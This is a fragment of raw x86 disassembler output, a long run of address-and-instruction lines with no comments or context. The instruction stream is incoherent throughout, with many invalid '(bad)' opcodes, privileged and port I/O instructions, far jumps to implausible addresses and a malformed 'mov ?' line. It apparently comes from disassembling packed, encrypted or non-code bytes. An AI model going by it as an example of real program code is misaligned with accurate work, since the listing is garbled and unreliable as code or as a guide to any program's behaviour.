  403994:	adc    ecx,eax
  403996:	jmp    0x405d47
  40399b:	inc    ebx
  40399c:	nop
  40399d:	jl     0x403948
  40399f:	rol    BYTE PTR [ecx-0x52337d56],1
  4039a5:	mov    ch,0x5d
  4039a7:	xor    al,BYTE PTR [ecx+0x7a]
  4039aa:	fucomip st,st(7)
  4039ac:	pop    esi
  4039ad:	add    DWORD PTR [ebx-0x7c7ca111],0xffffffc1
  4039b4:	add    esp,DWORD PTR [ebx+edx*1-0x52]
  4039b8:	jno    0x40396d
  4039ba:	or     al,0x7c
  4039bc:	mov    bh,0xb3
  4039be:	icebp  
  4039bf:	push   ds
  4039c0:	pop    edi
  4039c1:	cmp    DWORD PTR [edx+ebx*2-0x70],edi
  4039c5:	sbb    eax,0x4b900b76
  4039ca:	push   ss
  4039cb:	and    al,0x78
  4039cd:	xor    esi,edi
  4039cf:	clc    
  4039d0:	data16 fiadd DWORD PTR [eax]
  4039d3:	ins    BYTE PTR es:[edi],dx
  4039d4:	retf   
  4039d5:	arpl   cx,si
  4039d7:	jae    0x403a22
  4039d9:	hlt    
  4039da:	mov    al,ds:0x8dadfe91
  4039df:	xchg   bl,ch
  4039e1:	dec    edx
  4039e2:	dec    eax
  4039e3:	cmp    ebx,DWORD PTR [edx-0x7ab95bce]
  4039e9:	test   al,0x8e
  4039eb:	shl    bl,0xf
  4039ee:	test   BYTE PTR [esi+ebp*2-0x46],dh
  4039f2:	mov    bl,0xf3
  4039f4:	repnz xchg ebp,eax
  4039f7:	mov    eax,0x9ad51869
  4039fc:	outs   dx,DWORD PTR ds:[esi]
  4039fd:	or     BYTE PTR [esi+ebx*8+0x29ec55ef],bh
  403a04:	mov    ds:0xbedb2452,al
  403a09:	sbb    bh,BYTE PTR [ebp+0x14]
  403a0c:	push   0x3f8a7107
  403a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a12:	lock ins BYTE PTR es:[edi],dx
  403a14:	pusha  
  403a15:	in     eax,dx
  403a16:	sbb    edx,ecx
  403a18:	dec    edi
  403a19:	mov    edx,0x7ddca58
  403a1e:	mov    dl,0x34
  403a20:	inc    ebp
  403a21:	jle    0x4039e6
  403a23:	pop    ecx
  403a24:	cmp    DWORD PTR [ebp+ebp*1-0x5d],0xffffffe6
  403a29:	mov    ecx,0x849a2274
  403a2e:	cli    
  403a2f:	xor    dl,ah
  403a31:	ret    
  403a32:	mov    ebx,0x24fac5ae
  403a37:	hlt    
  403a38:	xchg   ebx,eax
  403a39:	and    bh,dh
  403a3b:	fs cmc 
  403a3d:	inc    edi
  403a3e:	ret    0x17a6
  403a41:	(bad)  
  403a42:	mov    bl,0x5d
  403a44:	sub    edi,DWORD PTR [edi-0x55]
  403a47:	call   0xe347b464
  403a4c:	stos   DWORD PTR es:[edi],eax
  403a4d:	lods   al,BYTE PTR ds:[esi]
  403a4e:	push   0x66
  403a50:	push   ss
  403a51:	xor    eax,0x7101a0f1
  403a56:	sub    ch,BYTE PTR [ebp+0x47]
  403a59:	pop    esi
  403a5a:	pop    edi
  403a5b:	outs   dx,DWORD PTR ds:[esi]
  403a5c:	adc    ch,BYTE PTR [ecx-0x7f]
  403a5f:	jecxz  0x4039f2
  403a61:	sbb    BYTE PTR [esi],bl
  403a63:	call   0x35353073
  403a68:	jae    0x403a7d
  403a6a:	nop
  403a6b:	(bad)  
  403a6c:	into   
  403a6d:	repz sub al,0x87
  403a70:	sbb    al,0xf0
  403a72:	int3   
  403a73:	fadd   st,st(2)
  403a75:	add    eax,0xabc31cf5
  403a7a:	sbb    BYTE PTR [esi+0x5e],0x69
  403a7e:	and    BYTE PTR [edx+0x63],bl
  403a81:	mov    al,0x9a
  403a83:	adc    al,ah
  403a85:	cmp    BYTE PTR [ebx-0x5a26a76e],cl
  403a8b:	or     dh,ch
  403a8d:	dec    ebp
  403a8e:	mov    ch,0xcb
  403a90:	ret    
  403a91:	iret   
  403a92:	mov    bl,0x71
  403a94:	pop    edi
  403a95:	shl    DWORD PTR [edx-0x78f0941a],0xa2
  403a9c:	cmp    eax,0x7d38837f
  403aa1:	mov    esp,0x2d29a11e
  403aa6:	fwait
  403aa7:	scas   eax,DWORD PTR es:[edi]
  403aa8:	and    ch,BYTE PTR [ecx+0xc]
  403aab:	data16 xor bl,BYTE PTR ds:[edx*8+0x17bb8fd4]
  403ab4:	jmp    0xb51e468
  403ab9:	inc    esi
  403aba:	sbb    DWORD PTR [esi+0x18],edi
  403abd:	dec    edx
  403abe:	pop    ebx
  403abf:	addr16 mov ebp,0x829137d7
  403ac5:	push   esi
  403ac6:	inc    esp
  403ac7:	mov    eax,ds:0xcf15e96c
  403acc:	xor    DWORD PTR [ebx],ebx
  403ace:	push   cs
  403acf:	adc    al,0x94
  403ad1:	not    DWORD PTR [ebp+0x7e]
  403ad4:	mov    edx,DWORD PTR ds:0x2a000250
  403ada:	jp     0x403a8d
  403adc:	mov    ebp,0xe3e9dc14
  403ae1:	cmc    
  403ae2:	mov    ds:0x5ec0d487,eax
  403ae7:	push   ecx
  403ae8:	mov    ebx,0xb0d1ef17
  403aed:	jg     0x403a8b
  403aef:	retf   0xdbf4
  403af2:	mov    al,0x8d
  403af4:	push   ds
  403af5:	mov    ds,WORD PTR [ecx]
  403af7:	pop    esp
  403af8:	xlat   BYTE PTR ds:[ebx]
  403af9:	or     bh,BYTE PTR [edx-0x5a1791aa]
  403aff:	mov    edx,0x3a4805e9
  403b04:	lea    esp,[esi+edx*4+0x1b8e3f9b]
  403b0b:	aam    0x22
  403b0d:	pop    ebx
  403b0e:	pop    ss
  403b0f:	in     al,dx
  403b10:	cwde   
  403b11:	xchg   edx,eax
  403b12:	(bad)  
  403b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b14:	test   DWORD PTR [ebp+0x0],0xb7b2c6e9
  403b1b:	jns    0x403b01
  403b1d:	pop    ebx
  403b1e:	ds stos BYTE PTR es:[edi],al
  403b20:	test   edi,0xc2fc7baf
  403b26:	cmp    ecx,DWORD PTR [ecx-0x34ebd5bd]
  403b2c:	ss jne 0x403b1b
  403b2f:	mov    ds:0xccde4dd4,al
  403b34:	xlat   BYTE PTR ds:[ebx]
  403b35:	aaa    
  403b36:	sub    al,0xcc
  403b38:	outs   dx,BYTE PTR ds:[esi]
  403b39:	shr    BYTE PTR [ebp-0x2c78ac32],1
  403b3f:	push   edi
  403b40:	mov    ds:0x27684893,eax
  403b45:	sub    esp,edx
  403b47:	das    
  403b48:	test   eax,0xd95a5bd5
  403b4d:	jno    0x403b9e
  403b4f:	xchg   esp,eax
  403b50:	push   ds
  403b51:	jmp    0x81210d39
  403b56:	mov    ebp,0xc64e39e9
  403b5b:	xchg   ebp,eax
  403b5c:	mov    es,WORD PTR [edx+0x78]
  403b5f:	aam    0x9a
  403b61:	es sahf 
  403b63:	push   esi
  403b64:	dec    esp
  403b65:	imul   ebx,esp,0x26e90484
  403b6b:	or     al,0x11
  403b6d:	push   ebp
  403b6e:	jo     0x403b68
  403b70:	mov    cl,0xb0
  403b72:	push   esi
  403b73:	dec    edi
  403b74:	pushf  
  403b75:	add    ah,dl
  403b77:	jno    0x403b16
  403b79:	fist   WORD PTR [eax+0x1f]
  403b7c:	leave  
  403b7d:	test   dh,dh
  403b7f:	mov    ebx,0x25041196
  403b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b85:	stos   DWORD PTR es:[edi],eax
  403b86:	(bad)  
  403b87:	into   
  403b88:	inc    ebp
  403b89:	mov    bh,al
  403b8b:	scas   al,BYTE PTR es:[edi]
  403b8c:	xchg   ecx,eax
  403b8d:	xlat   BYTE PTR ds:[ebx]
  403b8e:	int3   
  403b8f:	ret    
  403b90:	xor    esp,DWORD PTR [ebx]
  403b92:	neg    DWORD PTR [ebx]
  403b94:	icebp  
  403b95:	aaa    
  403b96:	add    ebx,DWORD PTR [eax-0x26]
  403b99:	jbe    0x403b7c
  403b9b:	jns    0x403bc2
  403b9d:	cmp    BYTE PTR [edi],bh
  403b9f:	adc    ebx,DWORD PTR [eax]
  403ba1:	adc    cl,ah
  403ba3:	lock or BYTE PTR [ebx],dl
  403ba6:	dec    edi
  403ba7:	xor    DWORD PTR [edx+0x4ce7399a],0x33650fae
  403bb1:	in     al,0x59
  403bb3:	and    cl,dl
  403bb5:	stos   BYTE PTR es:[edi],al
  403bb6:	mov    ecx,0xba0bee25
  403bbb:	mov    eax,ds:0x48546df0
  403bc0:	mov    esp,0x4e114dd5
  403bc5:	mov    ebp,0x129d31cf
  403bca:	xor    bh,bh
  403bcc:	add    ch,BYTE PTR [eax-0x684ee977]
  403bd2:	jns    0x403bed
  403bd4:	imul   ebx,DWORD PTR [edi-0x625b711b],0x9
  403bdb:	mov    BYTE PTR [ecx-0x64c5a04f],0x8
  403be2:	leave  
  403be3:	mov    bl,0xcc
  403be5:	cmp    BYTE PTR [ebx-0x73],0xcf
  403be9:	leave  
  403bea:	imul   eax,DWORD PTR [eax-0x21],0xffffffe6
  403bee:	cmp    eax,0xf2a19844
  403bf3:	punpcklbw mm2,DWORD PTR [eax]
  403bf6:	ss fucomi st,st(2)
  403bf9:	ins    DWORD PTR es:[edi],dx
  403bfa:	test   al,0x9b
  403bfc:	mov    BYTE PTR [edx+0x95a0279],al
  403c02:	jo     0x403c2f
  403c04:	dec    esp
  403c05:	and    DWORD PTR [edi+0x225fc893],0xcec4fc05
  403c0f:	ret    0x3835
  403c12:	repnz aaa 
  403c14:	xchg   ebp,eax
  403c15:	sahf   
  403c16:	cld    
  403c17:	(bad)  
  403c18:	out    dx,eax
  403c19:	mov    ch,0xe4
  403c1b:	add    al,0x98
  403c1d:	inc    edi
  403c1e:	dec    ebp
  403c1f:	mov    dl,0x13
  403c21:	jp     0x403bc7
  403c23:	repz mov esi,0x43c1569b
  403c29:	fwait
  403c2a:	cmp    dh,BYTE PTR [ecx+0x79]
  403c2d:	cmp    BYTE PTR [edx+0x481aa4ca],bl
  403c33:	in     al,0x1f
  403c35:	fwait
  403c36:	daa    
  403c37:	sub    ah,0x6b
  403c3a:	push   ebp
  403c3b:	jg     0x403c2a
  403c3d:	push   ecx
  403c3e:	sub    DWORD PTR [edx+0x147439c2],ebp
  403c44:	scas   eax,DWORD PTR es:[edi]
  403c45:	bound  eax,QWORD PTR [eax]
  403c47:	sub    DWORD PTR [bx-0x65e6],eax
  403c4c:	and    edx,DWORD PTR [ebx-0x76a65fc8]
  403c52:	pop    esi
  403c53:	or     ebp,DWORD PTR [esi-0x63367e87]
  403c59:	mov    dh,0x72
  403c5b:	push   edi
  403c5c:	add    eax,0x5036ea99
  403c61:	dec    ebx
  403c62:	jmp    0x38a415b6
  403c67:	or     ecx,DWORD PTR [edi+0x240f8b2]
  403c6d:	push   es
  403c6e:	fdiv   DWORD PTR [ecx-0x5d]
  403c71:	xchg   edi,eax
  403c72:	fisub  DWORD PTR [edi-0x50308870]
  403c78:	idiv   dl
  403c7a:	in     al,0xa8
  403c7c:	clc    
  403c7d:	and    DWORD PTR [ebp-0x7029ed4f],ebx
  403c83:	xchg   edi,eax
  403c84:	(bad)  
  403c85:	(bad)  
  403c86:	xchg   esp,eax
  403c87:	add    al,0x81
  403c89:	rol    BYTE PTR [ecx-0x44],1
  403c8c:	or     esp,esp
  403c8e:	add    edx,ecx
  403c90:	lods   al,BYTE PTR ds:[esi]
  403c91:	in     eax,dx
  403c92:	sub    DWORD PTR [ebp+0x31],ebx
  403c95:	fs in  eax,0xa4
  403c98:	cmp    BYTE PTR [esi-0x33],ch
  403c9b:	cli    
  403c9c:	loopne 0x403c9b
  403c9e:	pop    esp
  403c9f:	mov    ah,0x90
  403ca1:	sbb    esp,ebp
  403ca3:	xchg   DWORD PTR ds:0xdd63e0a,esp
  403ca9:	int    0x52
  403cab:	ret    0x7b52
  403cae:	out    dx,al
  403caf:	xor    al,0xad
  403cb1:	jbe    0x403d29
  403cb3:	or     BYTE PTR [ecx+edi*2],0xb3
  403cb7:	jge    0x403d08
  403cb9:	jns    0x403c69
  403cbb:	dec    edi
  403cbc:	ret    
  403cbd:	add    al,0x54
  403cbf:	jnp    0x403c80
  403cc1:	xor    edi,DWORD PTR [esi-0x7a]
  403cc4:	pushf  
  403cc5:	cmp    al,0xbc
  403cc7:	push   esp
  403cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc9:	xor    DWORD PTR [eax+0x5],edi
  403ccc:	aad    0x8c
  403cce:	sub    BYTE PTR [ebx],0x98
  403cd1:	dec    edi
  403cd2:	test   eax,0xdcdaeb46
  403cd7:	lods   eax,DWORD PTR ds:[esi]
  403cd8:	retf   
  403cd9:	adc    dl,ah
  403cdb:	fisub  WORD PTR [ebx]
  403cdd:	rcr    DWORD PTR ds:0x766c956,1
  403ce3:	inc    edx
  403ce4:	adc    al,0x2a
  403ce6:	xchg   esi,eax
  403ce7:	adc    DWORD PTR ds:0xeb87a66,esi
  403ced:	pop    ebx
  403cee:	cld    
  403cef:	call   DWORD PTR [esi-0x177a2d24]
  403cf5:	mov    al,ds:0xede7db5b
  403cfa:	dec    esi
  403cfb:	jo     0x403cca
  403cfd:	fs in  eax,0x73
  403d00:	leave  
  403d01:	and    ebp,DWORD PTR [ecx]
  403d03:	in     eax,0xcf
  403d05:	out    0x45,eax
  403d07:	cmc    
  403d08:	call   0xff36d10a
  403d0d:	mov    DWORD PTR [esp+edx*4-0x38],ecx
  403d11:	sahf   
  403d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d13:	or     eax,0x8dcb8d80
  403d18:	aad    0xca
  403d1a:	dec    ebp
  403d1b:	pop    es
  403d1c:	ja     0x403d2c
  403d1e:	ja     0x403d1a
  403d20:	push   edx
  403d21:	loopne 0x403d02
  403d23:	jg     0x403cf9
  403d25:	xlat   BYTE PTR ds:[ebx]
  403d26:	mov    ?,WORD PTR [edx]
  403d28:	or     al,0x3a
  403d2a:	in     al,dx
  403d2b:	sbb    DWORD PTR [ebx],ebx
  403d2d:	jge    0x403d68
  403d2f:	xchg   ecx,eax
  403d30:	mov    eax,ds:0xd2eaf56e
  403d35:	(bad)  
  403d36:	mov    edx,0xa948d1
  403d3b:	daa    
  403d3c:	cli    
  403d3d:	int3   
  403d3e:	(bad)  
  403d3f:	cmp    DWORD PTR [ecx-0x525daffc],ecx
  403d45:	cmp    al,0x2b
  403d47:	fwait
  403d48:	dec    ebx
  403d49:	xchg   edx,eax
  403d4a:	loopne 0x403db9
  403d4c:	sbb    DWORD PTR [esi],ecx
  403d4e:	jmp    0xc7a182ac
  403d53:	mov    ebp,0x604bbea8
  403d58:	push   0xd222851f
  403d5d:	jp     0x403d8c
  403d5f:	and    BYTE PTR [ecx-0x6a],al
  403d62:	pop    esp
  403d63:	repz jmp 0x3e9e56d4
  403d69:	int3   
  403d6a:	arpl   WORD PTR [ecx],sp
  403d6c:	in     al,dx
  403d6d:	js     0x403dab
  403d6f:	shl    dh,cl
  403d71:	repz adc ch,BYTE PTR [esi-0x1f]
  403d75:	jne    0x403d48
  403d77:	into   
  403d78:	push   ecx
  403d79:	daa    
  403d7a:	cld    
  403d7b:	lods   al,BYTE PTR ds:[esi]
  403d7c:	cld    
  403d7d:	(bad)  
  403d7e:	out    0x9a,al
  403d80:	repnz mov ah,BYTE PTR [edx-0x43]
  403d84:	(bad)  
  403d85:	loopne 0x403d0c
  403d87:	dec    edi
  403d88:	mov    cs,esi
  403d8a:	xlat   BYTE PTR ds:[ebx]
  403d8b:	cmc    
  403d8c:	sbb    ecx,DWORD PTR [esi-0x73]
  403d8f:	rcl    BYTE PTR [ebx+0x69139ea6],1
  403d95:	jo     0x403d80
  403d97:	repz enter 0xcdb2,0x54
  403d9c:	fcom   QWORD PTR [edi]
  403d9e:	xor    esi,0x1e
  403da1:	cmp    DWORD PTR [ebp-0x47],ecx
  403da4:	aas    
  403da5:	pop    esp
  403da6:	sti    
  403da7:	add    eax,ebp
  403da9:	and    ebp,0xffffffd9
  403dac:	dec    edi
  403dad:	call   FWORD PTR fs:[ebp-0x7dc212c]
  403db4:	imul   ebx,DWORD PTR [esi+eax*8],0xecc65f59
  403dbb:	inc    ecx
  403dbc:	sbb    DWORD PTR [edx+0x6d8bbe6],esi
  403dc2:	into   
  403dc3:	jmp    0x1f81:0x6bf035c8
  403dca:	inc    esi
  403dcb:	inc    edx
  403dcc:	cmp    al,0xce
  403dce:	cmp    DWORD PTR [edx],ecx
  403dd0:	dec    ebp
  403dd1:	jmp    0x5561:0x6b650e35
  403dd8:	mov    ch,0xf3
  403dda:	sub    dl,BYTE PTR gs:[esi]
  403ddd:	femms  
  403ddf:	lods   al,BYTE PTR ds:[esi]
  403de0:	adc    al,0x34
  403de2:	mov    cl,0x99
  403de4:	xor    dl,BYTE PTR [esi+0x7a]
  403de7:	ins    BYTE PTR es:[edi],dx
  403de8:	sbb    DWORD PTR [ecx],ebp
  403dea:	inc    edi
  403deb:	sbb    al,0xd4
  403ded:	data16 xlat BYTE PTR ds:[ebx]
  403def:	fist   WORD PTR [ebx+edi*2+0x30]
  403df3:	and    al,0xae
  403df5:	xchg   ebp,eax
  403df6:	pop    edi
  403df7:	push   ds
  403df8:	das    
  403df9:	sbb    ch,BYTE PTR [ecx-0x34b5250b]
  403dff:	and    al,BYTE PTR [ebp-0x3243c869]
  403e05:	jge    0x403dd2
  403e07:	cmc    
  403e08:	into   
  403e09:	dec    ebp
  403e0a:	mov    bh,0xc3
  403e0c:	fsub   QWORD PTR [eax+0x58]
  403e0f:	mov    eax,ds:0xd4e89369
  403e14:	adc    al,0x3a
  403e16:	fwait
  403e17:	cmp    eax,ecx
  403e19:	ret    0x34f1
  403e1c:	outs   dx,BYTE PTR ds:[esi]
  403e1d:	add    eax,0xe9adfc77
  403e22:	xchg   edx,eax
  403e23:	xlat   BYTE PTR ds:[ebx]
  403e24:	sbb    BYTE PTR [edx+0x39],ah
  403e27:	xor    eax,0xe3ffbfd1
  403e2c:	addr16 xchg edi,eax
  403e2f:	add    al,0xe8
  403e31:	aam    0x90
  403e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e34:	inc    edi
  403e35:	mov    WORD PTR [edx-0x4080845e],ds
  403e3b:	retf   0x40c1
  403e3e:	scas   eax,DWORD PTR es:[edi]
  403e3f:	xchg   ch,bh
  403e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e42:	retf   
  403e43:	repz jnp 0x403e90
  403e46:	jge    0x403e5f
  403e48:	or     eax,0x490023aa
  403e4d:	inc    edi
  403e4e:	arpl   WORD PTR [ecx+0x6c],bp
  403e51:	cmp    dh,BYTE PTR [esi+0x6d]
  403e54:	adc    bl,BYTE PTR [eax-0x3a936e7c]
  403e5a:	fnstenv [ebx+0x6a]
  403e5d:	sbb    esp,DWORD PTR [ecx+ebx*2]
  403e60:	xchg   edi,eax
  403e61:	or     eax,DWORD PTR [esi+0x7]
  403e64:	ret    
  403e65:	add    al,0x41
  403e67:	sbb    ch,ah
  403e69:	sbb    al,bl
  403e6b:	xchg   esi,eax
  403e6c:	gs (bad) 
  403e6e:	test   eax,0xaa1b1b52
  403e73:	adc    al,0xe5
  403e75:	aad    0x2e
  403e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e78:	inc    ebx
  403e79:	cmp    al,ah
  403e7b:	push   0xd6a90bd7
  403e80:	js     0x403e51
  403e82:	adc    al,BYTE PTR [ecx+eax*2-0x6f9d47fc]
  403e89:	adc    eax,0x3144db52
  403e8e:	sbb    al,0x56
  403e90:	adc    BYTE PTR [ecx+ebp*1+0x2f700433],dl
  403e97:	outs   dx,DWORD PTR ds:[esi]
  403e98:	pop    esp
  403e99:	jl     0x403ee4
  403e9b:	adc    ch,BYTE PTR [edx+0x57]
  403e9e:	addr16 das 
  403ea0:	(bad)  
  403ea1:	imul   ebp,esi,0xffffff82
  403ea4:	test   eax,0xe40a3b06
  403ea9:	mov    esi,0x614d2ba6
  403eae:	iret   
  403eaf:	push   ecx
  403eb0:	stc    
  403eb1:	add    eax,0xed84cabd
  403eb6:	mov    dh,0xf5
  403eb8:	fisttp WORD PTR [esi+eax*2-0x50]
  403ebc:	mov    al,0xd5
  403ebe:	sti    
  403ebf:	sbb    bh,cl
  403ec1:	jle    0x403eb9
  403ec3:	enter  0x9570,0x97
  403ec7:	cld    
  403ec8:	ret    
  403ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eca:	loope  0x403efd
  403ecc:	sub    ebx,edi
  403ece:	xor    al,0xa8
  403ed0:	mov    bh,0x5b
  403ed2:	stos   BYTE PTR es:[edi],al
  403ed3:	into   
  403ed4:	jecxz  0x403ef7
  403ed6:	xchg   al,dh
  403ed8:	push   0xffffffb2
  403eda:	hlt    
  403edb:	inc    ecx
  403edc:	test   al,0xc
  403ede:	xchg   ebx,eax
  403edf:	test   BYTE PTR [edi+eiz*8+0x42],ah
  403ee3:	mov    esp,0x6b24c039
  403ee8:	(bad)  
  403ee9:	rol    BYTE PTR [ecx],0xb0
  403eec:	pushf  
  403eed:	loop   0x403ec8
  403eef:	or     al,0x2f
  403ef1:	pop    ebp
  403ef2:	sbb    BYTE PTR [edx-0x4066311],bl
  403ef8:	call   0x77cf:0xc32185a5
  403eff:	ins    DWORD PTR es:[edi],dx
  403f00:	xor    eax,0xc014f1da
  403f05:	rcl    BYTE PTR [ebx+ebp*2+0x5200ff91],cl
  403f0c:	fs mov dh,al
  403f0f:	scas   eax,DWORD PTR es:[edi]
  403f10:	ins    BYTE PTR es:[edi],dx
  403f11:	sahf   
  403f12:	mov    ds:0xdad860ab,al
  403f17:	mov    al,ds:0x80609b11
  403f1c:	xor    ah,0xcf
  403f1f:	fsubr  QWORD PTR [eax]
  403f21:	add    ebp,DWORD PTR [ebx+0x7f]
  403f24:	ins    BYTE PTR es:[edi],dx
  403f25:	push   0x65
  403f27:	lock mov ebp,ss
  403f2a:	popa   
  403f2b:	adc    eax,0xe294f7d5
  403f30:	es mov dh,0x3
  403f33:	pop    ebx
  403f34:	outs   dx,BYTE PTR gs:[esi]
  403f36:	jge    0x403edc
  403f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f39:	fs pusha 
  403f3b:	jbe    0x403f61
  403f3d:	and    eax,0x2ce774b4
  403f42:	leave  
  403f43:	shl    DWORD PTR [eax+0x3c],0x1a
  403f47:	pop    es
  403f48:	(bad)  
  403f49:	or     ch,bl
  403f4b:	push   0x1736e35c
  403f50:	add    al,0xd6
  403f52:	pop    ebp
  403f53:	mov    esp,0xb346bf35
  403f58:	(bad)  
  403f59:	retf   
  403f5a:	loopne 0x403fd4
  403f5c:	in     al,0xc1
  403f5e:	aam    0xf8
  403f60:	popf   
  403f61:	loop   0x403f46
  403f63:	add    al,0x0
  403f65:	adc    dh,al
  403f67:	mov    ebx,0x8b83991a
  403f6c:	or     ebp,DWORD PTR [ebx+ebp*2]
  403f6f:	hlt    
  403f70:	pop    ebx
  403f71:	jb     0x403f7e
  403f73:	gs pop edi
  403f75:	xchg   edx,eax
  403f76:	ds pop ebx
  403f78:	xchg   esp,eax
  403f79:	xchg   ebx,eax
  403f7a:	pop    edx
  403f7b:	and    eax,ecx
  403f7d:	adc    eax,0x4f0f167c
  403f82:	into   
  403f83:	ds or  al,0x6d
  403f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f87:	fwait
  403f88:	xlat   BYTE PTR ds:[ebx]
  403f89:	(bad)  
  403f8a:	ficomp WORD PTR [ebx+0x24]
  403f8d:	sub    esp,esp
  403f8f:	push   edx
  403f90:	cmc    
  403f91:	mov    ch,0xc7
  403f93:	xor    DWORD PTR [edx-0x14e2849],0x62c6d272
  403f9d:	jno    0x403f88
  403f9f:	in     al,0x1a
  403fa1:	cld    
  403fa2:	sub    BYTE PTR [eax],bl
  403fa4:	jmp    0x5653235f
  403fa9:	xchg   edi,eax
  403faa:	je     0x403f42
  403fac:	je     0x403f49
  403fae:	loopne 0x403f35
  403fb0:	dec    BYTE PTR [ebx+0x44ae7a7f]
  403fb6:	xor    al,BYTE PTR [esi+0x24f890b0]
  403fbc:	mov    ebx,0xbfcfc8b2
  403fc1:	pop    es
  403fc2:	adc    al,0xcf
  403fc4:	pop    ebx
  403fc5:	add    eax,0xd904afdf
  403fca:	xor    edi,ebp
  403fcc:	pop    ebp
  403fcd:	mov    esp,0x475574dd
  403fd2:	jns    0x403f70
  403fd4:	fldenv [eax]
  403fd6:	push   es
  403fd7:	adc    al,0x6b
  403fd9:	mov    edx,0xee377375
  403fde:	pop    ebp
  403fdf:	stos   DWORD PTR es:[edi],eax
  403fe0:	lods   eax,DWORD PTR ds:[esi]
  403fe1:	int3   
  403fe2:	popf   
  403fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe4:	(bad)  
  403fe5:	xor    eax,0xf91ea5ac
  403fea:	outs   dx,BYTE PTR ds:[esi]
  403feb:	js     0x40404b
  403fed:	jecxz  0x403fce
  403fef:	cmp    DWORD PTR [esi],edi
  403ff1:	xchg   edi,eax
  403ff2:	ror    DWORD PTR [edi+0x2b0bb831],1
  403ff8:	push   edi
  403ff9:	xchg   ecx,eax
  403ffa:	xchg   esi,eax
  403ffb:	push   ebp
  403ffc:	fdivr  st,st(5)
  403ffe:	dec    edx
  403fff:	cwde   
  404000:	repnz push cs
  404002:	fidivr DWORD PTR [edx-0x3e]
  404005:	or     BYTE PTR [ebp+0x2f],ch
  404008:	mul    BYTE PTR [eax+0x8]
  40400b:	or     BYTE PTR [edi+eax*8+0x1fe6259d],0xf9
  404013:	loope  0x404058
  404015:	xlat   BYTE PTR ds:[ebx]
  404016:	jp     0x404002
  404018:	out    0xc3,eax
  40401a:	leave  
  40401b:	fimul  DWORD PTR [ebx-0xd2c7ba1]
  404021:	cmp    al,BYTE PTR [esi-0x41]
  404024:	enter  0x32e2,0xa7
  404028:	adc    esp,0xf41724f3
  40402e:	cmp    BYTE PTR [ebx],ah
  404030:	sti    
  404031:	cmp    BYTE PTR gs:[edx+0x32],ah
  404035:	push   0x5e
  404037:	es xchg ebx,eax
  404039:	and    al,0x3d
  40403b:	shr    ch,0x67
  40403e:	(bad)  
  40403f:	pop    edx
  404040:	sub    cl,bh
  404042:	icebp  
  404043:	call   0x2e51618d
  404048:	pop    edx
  404049:	mov    ah,0xe5
  40404b:	pop    ebp
  40404c:	fnstenv [esi]
  40404e:	jl     0x40408f
  404050:	dec    esp
  404051:	push   ds
  404052:	or     ebp,0xa5f28893
  404058:	lock lods al,BYTE PTR ds:[esi]
  40405a:	xor    cl,BYTE PTR [edx-0x398a35f9]
  404060:	pop    edx
  404061:	xor    ecx,DWORD PTR [ecx-0x4c]
  404064:	or     dh,BYTE PTR [edx+0x6be06502]
  40406a:	dec    edi
  40406b:	xchg   ah,cl
  40406d:	int    0xcd
  40406f:	pop    ebx
  404070:	xchg   esp,eax
  404071:	dec    ebp
  404072:	mov    ah,BYTE PTR [ebp+0x1b]
  404075:	mov    dh,0xee
  404077:	and    BYTE PTR [ebx+0x63],ah
  40407a:	adc    esi,DWORD PTR [edx+0x75]
  40407d:	(bad)  
  40407e:	jae    0x404009
  404080:	sub    ah,BYTE PTR [eax+0x1a]
  404083:	cs sbb ebx,esi
  404086:	xchg   ebx,eax
  404087:	or     cl,BYTE PTR [ebp-0x721f215d]
  40408d:	jmp    0x404034
  40408f:	fstp   TBYTE PTR [ebx]
  404091:	fwait
  404092:	int    0x62
  404094:	dec    ebx
  404095:	push   ecx
  404096:	and    dl,dl
  404098:	jmp    FWORD PTR [esi+0x35]
  40409b:	lds    edi,FWORD PTR [eax]
  40409d:	fld    TBYTE PTR [edi-0x67b91b41]
  4040a3:	dec    esp
  4040a4:	frstor [ecx+0x60818f62]
  4040aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ab:	addr16 add ch,dl
  4040ae:	mov    ebp,0xcb6a7712
  4040b3:	dec    esp
  4040b4:	and    ebp,esi
  4040b6:	xchg   esp,eax
  4040b7:	pop    ss
  4040b8:	cmp    edi,DWORD PTR [ebx]
  4040ba:	push   esi
  4040bb:	bound  edx,QWORD PTR [esp+eax*4-0x1a593d13]
  4040c2:	jne    0x4040c5
  4040c4:	into   
  4040c5:	mov    ecx,0xdea0c05d
  4040ca:	jge    0x4040f3
  4040cc:	aaa    
  4040cd:	scas   al,BYTE PTR es:[edi]
  4040ce:	nop
  4040cf:	mov    eax,esi
  4040d1:	pop    ebx
  4040d2:	xchg   edx,eax
  4040d3:	xchg   BYTE PTR [ebp+0x4e],ah
  4040d6:	mov    WORD PTR [edx+esi*2],ds
  4040d9:	into   
  4040da:	mov    WORD PTR [edi+0x430f865c],fs
  4040e0:	pop    edx
  4040e1:	call   FWORD PTR [ebp-0x24]
  4040e4:	hlt    
  4040e5:	(bad)  
  4040e6:	adc    al,0xe3
  4040e8:	ss xchg esp,eax
  4040ea:	fcomp  QWORD PTR [ebx]
  4040ec:	inc    eax
  4040ed:	or     esp,ebp
  4040ef:	jle    0x4040a6
  4040f1:	rol    BYTE PTR [ecx+0x73bfaf67],1
  4040f7:	xchg   esp,eax
  4040f8:	je     0x404130
  4040fa:	sub    al,0x21
  4040fc:	outs   dx,BYTE PTR ds:[esi]
  4040fd:	hlt    
  4040fe:	nop
  4040ff:	dec    ebx
  404100:	test   al,0x37
  404102:	(bad)  
  404103:	rcr    BYTE PTR [edi+0x41],cl
  404106:	push   cs
  404107:	jl     0x4040ac
  404109:	call   0xa8d5:0x356b
  40410f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404110:	call   FWORD PTR [edi+0x69dcca02]
  404116:	loope  0x404112
  404118:	aaa    
